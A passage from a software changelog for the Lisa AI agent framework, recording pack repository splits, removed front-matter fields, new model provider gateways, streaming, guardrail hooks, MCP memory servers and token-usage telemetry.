- **`/models update <NL>` replaces `/advise-models` (hard cutover, no compat).** The `advise-models` mode and `models advise` hint are removed. `/models update` runs the `advise_models` operation directly from `handle_models_command`: it edits + validates the proposal via an LLM, writes it to `models.proposed.yaml`, then promotes it to `models.yaml` in one step. The operation's `mode_allowlist` is dropped so it runs as a host-command op from any mode. `complete_fn` is wired via `complete_live` (the same primitive `turn_hooks_builder` uses), `resolve_model_fn` via `resolve_little_lisa_model`, and storage tools via the host `mcp_tool_pool`.
- **`lisa_packs` is now a parent repo with 7 per-pack submodule repos.** `brave_search`, `cloudflare`, `coding`, `github`, `gmail`, `mem0`, and `stripe` each live in their own `github.com/Lisa-Framework/lisa-pack-<name>` repository and are pinned into `lisa_packs/<pack>/` as git submodules, preserving the `lisa_packs/<pack>/lisa_packs/<pack>/...` namespace layout. `model_picker` is removed from `lisa_packs` (it now lives in this framework tree). Existing clones of `lisa-framework/packs` must run `git submodule update --init --recursive` after pulling the split commit.

#### `route_hints` and `examples` front-matter fields removed (hard cutover)

- **`route_hints` and `examples` removed from all `_mode.md` front matter and the loader.** Both fields were vestigial from the removed separate-stateless-planner router (`kernel/router.py:plan_route`). Under the unified FSM, no runtime path read either field — they were parsed, validated, stored on `WorkflowModeConfig`, and never consumed at turn time. Removed from: all mode `_mode.md` files (`default` ×2, `learn`, `markdown`, `discuss`, `search`, `ponder`), `kernel/ipsar_fsm.py` (loader blocks + `_KERNEL_OWNED_FRONT_MATTER_KEYS`), `kernel/models.py` (`WorkflowModeConfig.route_hints` + `WorkflowModeConfig.examples` fields), `kernel/context/mcp_catalog.py`, `sdk/content/_catalog.py`, and `kernel/tests/test_catalog_loader.py`.

#### Pack repository split

- **External packs moved to `github.com/lisa-framework/packs`**: `lisa_pack_brave_search`, `lisa_pack_cloudflare`, `lisa_pack_github`, `lisa_pack_gmail`, `lisa_pack_mem0`, `lisa_pack_model_picker`, and `lisa_pack_stripe` are now in the standalone `lisa_packs` repo. Import paths renamed from `lisa_pack_*` to the shared `lisa_packs.*` namespace (e.g. `lisa_packs.cloudflare`). The framework consumes them via path dependencies (`../lisa_packs/<pack>`).
- **`lisa-pack-model-picker` moved to `../lisa_packs/model_picker`**: Moved out of the bundled `sdk/packs/model_picker` workspace member to the external `lisa_packs` repo. Import path renamed from `sdk.packs.model_picker` to `lisa_packs.model_picker`. Now consumed via a path dependency (`../lisa_packs/model_picker`) alongside the other external integration packs.

### Added

#### Coding workflow (`lisa-pack-coding`)

- Added the catalog-native local coding workflow: bounded workspace inspection, isolated Git worktrees, checked patch application, named finite checks, protected-branch commit and non-force push controls, and artifact-backed GitHub pull-request publication. Effectful steps require a host-owned exact approval and resume only the approved invocation.

#### Kernel (`lisa-kernel`)

- Extension front matter support: `WorkflowModeConfig.extra_front_matter` now carries every app/pack-owned front-matter key the kernel does not interpret (e.g. `lenses` — mode perspective tags like `lens.conversation`, `lens.reflection`). The kernel owns a fixed set of front-matter keys (routing, FSM, operation bindings, workshop config) and passes everything else through opaquely as extension data. Hosts and packs read `extra_front_matter` directly; the kernel never names, validates, or curates app-owned keys, so adding a new app-owned front-matter key requires no kernel change.
- Front-matter overrides via an optional sibling `_overrides.yaml` file beside each `_mode.md`. Apps can manage extension front matter (and a small set of kernel-owned but overridable fields: `description`, `default_model`) without editing pack-owned `_mode.md` files. The boundary is a **denylist**: the kernel names only the keys it owns and protects (routing, FSM, operation bindings, workshop config); attempting to override any kernel-owned key is rejected with a startup validation error. Every other key is app/pack-owned and passes through untouched. Overrides are deep-merged on top of the authored front matter; list values replace (not concatenate).

### Changed

#### Non-core pack externalization (Phase 1 + 2)

- **Upgraded `cloudflare`, `github`, `stripe` packs to full packs**: each now includes modes (`/cloudflare`, `/github`, `/stripe` action modes), operations (`cloudflare_status`, `github_status`, `stripe_status`), content (system prompts), `get_content_root()`, and `content_roots` entry points — in addition to their existing SDK extensions (signal connectors, anomaly detectors, heartbeat context, digest sections, context evidence, refresh summary sections).
- **Added `anomalies.py` + `anomaly_detectors` entry point to `stripe` pack** (was the only pack missing this extension kind).
- **Migrated pack import paths from `sdk_packs.*` to top-level `lisa_pack_*`**: `sdk_packs.cloudflare` → `lisa_pack_cloudflare`, `sdk_packs.github` → `lisa_pack_github`, `sdk_packs.stripe` → `lisa_pack_stripe`. Each pack is now a standalone top-level Python package installable independently.
- **Moved `sdk_packs/_settings.py` to `sdk/pack_settings.py`**: the shared `OwnedSettingsSource` and `build_owned_settings_sources` helpers now live in the SDK so external packs can import them without depending on `sdk_packs`.
- **Updated root `pyproject.toml` workspace members**: `sdk_packs/cloudflare`, `sdk_packs/github`, `sdk_packs/stripe` replaced by `lisa_pack_cloudflare`, `lisa_pack_github`, `lisa_pack_stripe` top-level directories. `sdk_packs/core` and `sdk_packs/search` remain as in-repo reference implementations.
- **Pack tests**: added `test_catalog.py` to each pack verifying mode discovery, operation discovery, and operation-mode allowlist consistency.

### Added

#### MCP memory + context (Part 3)

- `lisa-context` MCP server owns the SQLite-backed memory store and context broker.
- Kernel no longer ships in-process memory stores or memory hooks; memory is MCP-only.
- Memory tools exposed over MCP: `add_memory`, `search_memory`, `list_memories`, `get_memories`.
- Context broker exposed over MCP: `broker_context` returns `ContextBrokerResponse` (packet + markdown).

#### Kernel-as-MCP servers (Part 4)

- Added four MCP server packages under `mcp_server/src/`: `lisa_context` (memory tools), `lisa_operations` (operation tools), `lisa_search` (search tools), and `lisa_surf` (surf tools).
- **`mcp_server/pyproject.toml`** updated with script entry points: `lisa-context`, `lisa-operations`, `lisa-search`, `lisa-surf`.
- **`mcp_server/tests/test_mcp_servers.py`** — 17 tests validating tool registration and in-process dispatch for all four servers.

#### AWS Bedrock gateway (Part 1.2)

- **`BedrockGateway`** class in `kernel/provider_core.py` — AWS Bedrock runtime gateway via boto3 (optional dependency). Uses the Converse API (`bedrock-runtime.converse()`) for normalized cross-model interface across Claude, Llama, Nova, and Titan. Sync boto3 calls wrapped with `asyncio.to_thread`.
- **`_build_bedrock_messages`** helper — translates OpenAI-style messages to Converse `messages[]` format: `tool`-role → `user` with `toolResult` content blocks; `assistant`+`tool_calls` → `assistant` with `text` + `toolUse` content blocks; other roles pass through.
- **`_openai_tool_to_bedrock_tool`** helper — converts `{"type":"function","function":{...}}` to Converse `{"toolSpec":{"name":...,"description":...,"inputSchema":{"json":...}}}` shape.
- **`_extract_bedrock_response`** helper — extracts text and `toolUse` blocks from Converse response into flat OpenAI-shape `tool_calls`.
- **`_extract_bedrock_usage`** helper — extracts `inputTokens`, `outputTokens`, `totalTokens` from Converse usage.
- **Optional boto3**: `BedrockGateway.__init__` raises `ImportError` with pip instructions if `boto3` is not installed. No new required dependency in `kernel/pyproject.toml`.
- **Provider routing**: `KernelProviderGatewayProvider.gateway_for("aws")` returns `BedrockGateway`.
- **`kernel/tests/test_bedrock_gateway.py`** — 11 tests covering text-only, tool-use, tool-use-only, multi-block text, tool translation, assistant+tool_calls round-trip, system prompt, usage, `supports()`, and routing. All tests stub the boto3 client.

#### Google Gemini gateway (Part 1.1)

- **`GoogleGeminiGateway`** class in `kernel/provider_core.py` — REST API gateway for Google Gemini via `httpx.AsyncClient` (no new deps). Supports text generation, tool calling (functionDeclarations → functionCall → functionResponse), system instructions (top-level `systemInstruction`), and usage extraction from `usageMetadata`.
- **`_build_gemini_contents`** helper — translates OpenAI-style messages to Gemini `contents[]` format: `user`→`"user"`, `assistant`→`"model"`, `tool`-role→`functionResponse` parts, `assistant`+`tool_calls`→`text`+`functionCall` parts.
- **`_openai_tool_to_gemini_function`** helper — converts `{"type":"function","function":{...}}` to Gemini's `{"name":...,"description":...,"parameters":...}` shape.
- **`_extract_gemini_response`** helper — extracts text parts and `functionCall` parts from Gemini response, synthesizes `gemini_call_N` IDs (Gemini has no native tool-call IDs).
- **`_extract_gemini_usage`** helper — extracts `promptTokenCount`, `candidatesTokenCount`, `totalTokenCount`, `cachedContentTokenCount` from `usageMetadata`.
- **Provider routing**: `KernelProviderGatewayProvider.gateway_for("google")` returns `GoogleGeminiGateway`.
- **`kernel/tests/test_google_gateway.py`** — 11 tests covering text-only, tool-use, tool-use-only, multi-block text, tool translation, assistant+tool_calls round-trip, system prompt, usage, `supports()`, and routing.

#### Streaming support (Part 2 — v1: OpenAI + Anthropic)

- **`StreamedChunk` and `StreamedCompletion` dataclasses** in `kernel/provider_core.py`. `StreamedChunk` carries `content` (delta text), `finish_reason` (`'stop'`, `'length'`, `'tool_calls'`, or `None`), and `usage` (only on the last chunk). `StreamedCompletion` aggregates chunks with `content`, `tool_calls`, `usage`, `finish_reason`, and the original `chunks` list.
- **`_aggregate_streamed_chunks` helper** — concatenates chunk content, picks the last non-`None` `finish_reason` and `usage`, returns a `StreamedCompletion`.
- **`TurnHooks.complete_stream`** field — optional async generator hook. When set, the turn runner uses it instead of `complete()` for the model call. v1 streams tokens only; tool-call streaming deferred to v2.
- **Turn runner streaming path** — if `hooks.complete_stream` is set, the tool loop iterates chunks via `async for`, aggregates them, and wraps the result in `StreamedCompletionAdapter`. When `finish_reason == 'tool_calls'`, falls back to `complete()` for that iteration to get the structured tool-call payload.
- **`StreamedCompletionAdapter`** in `kernel/turn_runner.py` — bridges `StreamedCompletion` to the `CompletionResult`-like interface (`.content`, `.tool_calls`, `.usage`) expected by the tool loop.
- **`OpenAICompatibleGateway.complete_stream()`** — streams via `client.chat.completions.create(stream=True, stream_options={"include_usage": True})`. Yields `StreamedChunk` for each SSE event.
- **`AnthropicGateway.complete_stream()`** — streams via `client.messages.stream()` async context manager. Extracts `text_delta` events for content deltas, `message_stop` for finish_reason, and `get_final_message()` for usage.
- **`kernel/tests/test_streaming.py`** — 14 tests covering type defaults, chunk aggregation, OpenAI gateway streaming, Anthropic gateway streaming, turn runner streaming path, and tool_calls fallback.

#### Anthropic gateway tool-use path (Part 1.3)

- **`AnthropicGateway.complete()`** rewritten to translate OpenAI-format messages and tools into Anthropic format and extract `text`/`tool_use` content blocks back into the normalized `CompletionResult`. Handles system-prompt extraction (top-level `system` param), `temperature`, `tools` (via `_openai_tool_to_anthropic_tool`), and `thinking` budget when `model_def.thinking_model` is set.
- **`_build_anthropic_messages`** helper in `kernel/provider_core.py` — translates OpenAI chat messages to Anthropic messages format: `tool`-role messages become `user` messages with `tool_result` content blocks; `assistant` messages with `tool_calls` become `assistant` messages with `text` + `tool_use` content blocks; all other messages pass through.
- **`_openai_tool_to_anthropic_tool`** helper in `kernel/provider_core.py` — converts `{"type":"function","function":{...}}` to Anthropic's `{"name":...,"description":...,"input_schema":...}` shape.
- **Provider routing fix**: `KernelProviderGatewayProvider.gateway_for("anthropic")` now returns `AnthropicGateway` instead of incorrectly falling through to `OpenAICompatibleGateway`.
- **`kernel/tests/test_provider_core.py`** — 13 tests covering text-only, tool-use, tool-use-only, multi-block text, tool round-trip, assistant+tool_calls round-trip, temperature pass-through, system-prompt extraction, usage extraction, and provider routing.

#### Guardrails seam (Part 7.1–7.4)

- **`GuardResult` dataclass** in `kernel/seams/protocols.py` with `allowed`, `blocked_reason`, `sanitized_text`, and `annotations` fields.
- **`InputGuard` and `OutputGuard` Protocols** (`@runtime_checkable`) in `kernel/seams/protocols.py`. `InputGuard.validate(query, surface) -> GuardResult` runs in Phase 1 before the pre-turn slice; `OutputGuard.validate(text, surface) -> GuardResult` runs in Phase 3 after the tool loop and before `store_memory`.
- **`PassThroughInputGuard`** (`kernel/context/input_guard.py`) and **`PassThroughOutputGuard`** (`kernel/context/output_guard.py`) — default implementations that allow everything. Hosts override with real safety implementations (Azure AI Content Safety, Bedrock Guardrails, Presidio, regex, etc.).
- **`ContextSeams.input_guard` and `ContextSeams.output_guard`** fields with lazy default factories, mirroring the existing seam pattern.
- **`TurnResult.blocked`** field (`bool = False`) — set to `True` when an input or output guard blocks the turn.
- **Turn runner wiring**: input guard short-circuits before the model call (no house-keeping budget consumed); output guard replaces blocked content with a safe fallback, publishes a `guardrail.audit` event on the `EventBus`, and skips the post-turn slice. `on_turn_complete` and `store_memory` still fire with the safe-fallback text so the audit trail is complete.
- **`kernel/tests/test_guardrails.py`** — 7 tests covering pass-through, blocking, sanitizing, and no-regression paths.
- **`docs/KERNEL_ARCHITECTURE.md`** — guardrails section documenting the two insertion points, the `GuardResult` contract, and the enterprise implementation guide.

#### MCP-native kernel cutover

- **Phase 1 — Context seams**: 6 new Protocols in `kernel/seams/protocols.py` (`ContentRegistry`, `ModelPolicy`, `ProviderGatewayProvider`, `EventBus`, `DataSanitizer`, `ExtensionItemBuilder`) with 6 default implementations under `kernel/context/`. `ContextSeams` dataclass on `TurnHooks` with lazy default factories. 3 context modules rewritten to depend on seams instead of `app.*` imports. 5 dead modules deleted. ~50 new config fields for context broker, memory, and passive intelligence settings. Full design spec in `docs/MCP_NATIVE_DESIGN.md`.
- **Phase 2 — MCP tool pool**: `kernel/tools/mcp_client.py` (`MCPToolPool`, `MCPClientConfig`, `MCPToolSpec`, `MCPToolResult`) and `kernel/tools/schema_translator.py` (OpenAI + Anthropic stub translators). `TurnHooks.build_extra_tool_schemas` and `execute_tool` replaced by `mcp_tool_servers: list[MCPClientConfig]`. Turn runner tool loop rewritten: `pool.list_tools()` → translate to OpenAI → send → translate back → `pool.call_tool()`. `build_openai_operation_schema` removed — operations are no longer advertised as tool schemas. Little Lisa updated: `execute_tool` removed from `TurnHooks`, `mcp_tool_servers=[]` wired, `operation_catalog` kwarg removed from `run_turn`.

#### Kernel (`lisa-kernel`)

- Durable token-usage telemetry handler (`kernel/token_usage.py`) with `TokenUsageTelemetryHandler` (appends every `TokenUsageEvent` to `token-usage.jsonl` under the host's data directory, with timestamp+nanosecond idempotency keys) and `build_token_usage_event` factory. Closes the gap where `TokenUsageEvent` was defined but never published or persisted.
- `CompletionUsage.duration_ms` field on provider results so time-based providers (e.g. Ollama local GPU time) can be billed by wall-clock duration alongside token counts.
- `TokenUsageEvent.duration_ms`, `TokenUsageEvent.time_cost_usd`, and `TokenUsageEvent.kind="time_billed"` for duration-based billing accounting.

#### Little Lisa (`little-lisa`)

- `StubCompletion` now carries `cached_tokens`, `reasoning_tokens`, and `duration_ms` so sub-counters and time are no longer silently dropped at the host boundary.
- `TurnResult` now carries `cached_tokens`, `reasoning_tokens`, `duration_ms`, and `latency_ms` so the turn runner accumulates them across tool-loop iterations.
- `_complete_live` publishes one `TokenUsageEvent` per LLM call (Anthropic and OpenAI-compatible paths) to the durable JSONL handler.
- `_apply_turn_usage` records `cached_tokens`, `reasoning_tokens`, `duration_ms`, and `latency_ms` in the per-turn ledger and per-model/mode/stage breakdowns.
- Session summary renders cached, reasoning, and duration columns in the Token Totals, By Model, By Mode, and By Stage tables.
- `_ensure_usage_entry` upgrades pre-existing breakdown dicts (with the old 3-key schema) in place so the accumulator math never raises `KeyError`.

### Changed

#### Kernel (`lisa-kernel`)

- Renamed kernel subpackages for narrative coherence: `kernel/io/` → `kernel/seams/` (host-injection protocols), `kernel/signal_connectors/` + `kernel/data_sources/` + `kernel/domain_knowledge/` → `kernel/intake/` (unified external data collection), `kernel/intelligence/` → `kernel/synthesis/` (post-collection pipeline). Entry-point group names unchanged in this phase; migration planned with deprecation window.
- Operation registry now skips `.py` modules that have a sibling `<stem>.operation.md` declarative entrypoint. These modules hold the Pydantic response-format contract for a prompt-authored operation, not a runtime `execute(ctx)` entrypoint, so they no longer trigger spurious `missing '<stem>.yml'` warnings during catalog load.
- `_extract_completion_usage` (turn runner) now returns a 7-tuple including `cached_tokens`, `reasoning_tokens`, `duration_ms`, and `latency_ms`; callers updated accordingly.
- `_extract_usage_counts` (Little Lisa) now returns a 5-tuple including `cached_tokens` and `reasoning_tokens`; both call sites updated.

## [0.1.0] — Unreleased

### Added

#### Kernel (`lisa-kernel`)

- Runtime-neutral FSM engine (`ipsar_fsm.py`) with mode catalog loading, stage validation, transition tool schema, and operation lifecycle hooks (entry, pre-turn, post-turn).
- IPSAR route resolution (`ipsar.py`) for detecting user-facing mode targets from natural-language messages.
- Shared routing engine (`router.py`) with fast-path regex matching, verifier-model confirmation, model-bounded routing fallback, and structured-output retry.
- Turn runner (`turn_runner.py`) — the single model+tool loop shared by lightweight hosts and the full app, with `TurnHooks` extension points and three-phase execution (pre-turn → tool loop → post-turn).
- Opportunistic slice system (`slice.py`) with pressure-model budget math: budget grows as a function of idle time, not a wall-clock tick.
- Pydantic contracts (`models.py`) for surface context, route decisions, operation execution, tool execution, workflow FSM, workshop fan-out, memory, web search, intelligence pipeline, unified state, context evidence, anomaly alerts, domain knowledge, self-model, and more.
- Provider gateway abstractions (`provider_core.py`) with `AzureOpenAIGateway`, `OpenAICompatibleGateway`, completion/embedding request/result dataclasses, and Anthropic usage extraction.
- Model manifest loader (`model_manifest.py`) with YAML/JSON parsing, designation-based model resolution, and per-mode model overrides.
- Content roots discovery (`content_roots.py`) via `lisa.extensions.content_roots` entry points and `SDK_CONTENT_ROOTS` env var.
- Extension runtime contracts (`extension_runtime.py`) for scheduled jobs, state hydration, heartbeat context, digest sections, debug context, anomaly detectors, and context evidence builders.
- Signal connector base class (`intake/connectors.py`) and data source base class (`intake/sources.py`).
- Brave Web Search integration (`web_search.py`) with configurable endpoint, market, and result count.
- MCP memory client (`mcp_client.py`) for delegating memory operations to the `lisa-context` MCP server over stdio.
- OpenAI function-tool schema builder (`openai_function_tools.py`) with strict-mode support.
- Blank state provider (`state_providers.py`) for hosts that don't need memory.
- OpenTelemetry span helpers (`telemetry.py`).
- Kernel-owned settings (`config.py`) for surf, web search, and workshop budgets.
- Extension harness (`testing/extension_harness.py`) for validating connectors and data sources without a host app.
- Operation registry (`operations/registry.py`) for discovering and executing operations from packs.

#### SDK (`lisa-sdk`)

- Author-facing helper contracts for packs, workshop execution, rendering, and integration contracts.
- `WorkshopExecutionService` (`workshop_execution.py`) for safe child-workflow fan-out with isolated session keys and structured concurrency.
- `RichAttachment` and `RefreshSummarySection` rendering contracts (`rendering.py`) for host-neutral rich reply content.
- SDK-owned settings (`config.py`) for heartbeat interval, signal timeout, memory recall limit, and surf/web search defaults.
- Import-boundary test enforcing `sdk` isolation from private app modules.

#### Integration Packs (`lisa-pack-*`)

- `lisa-pack-cloudflare`: Cloudflare signal connector with GraphQL analytics (worker requests/errors/CPU, edge status codes, KV/Durable Objects/D1 metrics, WAF events, Pages projects), anomaly detection, context evidence, heartbeat context, digest sections, and refresh summary.
- `lisa-pack-github`: GitHub signal connector with repo status, commit info, workflow runs, open PRs, anomaly detection, context evidence, heartbeat context, digest sections, refresh summary, read-only code search/file excerpt/tree listing client, and write-capable PR creation client with protected-branch safety.
- `lisa-pack-stripe`: Stripe billing signal connector with active/trialing subscriptions and MRR, context evidence, heartbeat context, digest sections, and refresh summary.

#### Packs (`lisa-pack-*`)

- `lisa-pack-core`: baseline public modes (default, workshop), authored routing prompts, user context templates, and research workshop operation with planner+synthesis pipeline.
- `lisa-pack-search`: research & reasoning pack owning discuss, search, and ponder modes plus the web_search tool, the web_research research-loop operation, and the discussion_briefing pre-turn operation. Discuss was absorbed from core so each mode is co-located with its enrichment operations.

#### Little Lisa (`little-lisa`)

- Local terminal host CLI with seven subcommands: `cli` (interactive REPL), `desktop` (localhost web UI), `verify` (environment checks), `setup` (interactive provider configuration wizard), `modes` (list supported/installed modes), `models` (list configured models with designations), and `once` (single-turn execution).
- Tray-first desktop mode: `little-lisa` with no arguments launches a system tray icon (Windows/macOS/Linux via `pystray`) that manages a desktop web host subprocess.
- Local aiohttp desktop web server with token-authenticated chat API, health check, and last-turn context endpoint.
- Manifest-driven model routing with `router`, `default`, and `deep` designations supporting `azure_openai`, `openai`, `anthropic`, and `ollama` providers.
- Terminal streaming support (`--streaming none|stage|text|hybrid[:delay]`) with configurable character delay.
- Structured JSONL turn logging with `--log`, `--no-log`, and `--log-level` options.
- Router diagnostics via `/debug router` with planner reasoning, confidence scores, fallback tracking, and structured-output retry recording.
- Runtime introspection commands: `/help capabilities`, `/settings`, `/debug context`, `/debug capabilities`, `/debug self`.
- File-backed thread persistence with `--thread-dir` and `--no-thread` options.
- Configurable artifacts root via `--data-dir` and memory store path via `--memory-db`.
- `--user`, `--session-context`, `--timezone`, and `--state-snapshot` runtime options.
- `prompt_toolkit` integration for command history and slash-command completion in CLI mode.
- MCP-backed memory via `lisa-context` with `--memory-db` override.
- `LittleLisaStateProvider` with bounded thread compaction and memory eviction via the slice system.
- `LocalBlobIO` for file-backed blob operations used by Markdown artifact generation.

#### MCP Server (`mcp-server`)

- FastMCP server (`"Lisa Context Server"`) exposing four memory tools over stdio: `add_memory`, `search_memory`, `get_memories`, `list_memories`.
- Surface-scoped privacy isolation enforced at the tool level.
- SQLite-backed memory store with configurable database path via `LISA_MCP_DB_PATH`.

#### Tooling & CI

- Hermes installer scripts (`install.sh`, `install.ps1`) with provider selection (`ollama`, `openai`, `azure_openai`, `anthropic`, `google`), custom install directory/branch, and optional diagnostics skip.
- CI matrix (Ubuntu, macOS, Windows × Python 3.11, 3.12).
- PyPI publish workflow on `v*` tags.
- `pytest` markers: `live` (real external APIs), `integration` (multi-module in-process), `eval` (deterministic agent regression, no model calls).
- Import-boundary tests across all packages enforcing public/private separation.

### Changed

- `little-lisa` turn logs now emit top-level resolved model fields and per-invocation token totals for both router planning and mode execution, making `turn.completed` JSONL entries readable without deep payload expansion.
- Router routing retries once without `response_format` when the first structured-output call fails, using explicit JSON-only instructions before deciding fallback.
- Slice budget is pressure-driven: budget grows as a function of idle time since the last slice finished, not a wall-clock tick. This is the canonical pattern for opportunistic house-keeping (reindex, eviction, sync) — everything not wall-clock bound is a candidate.
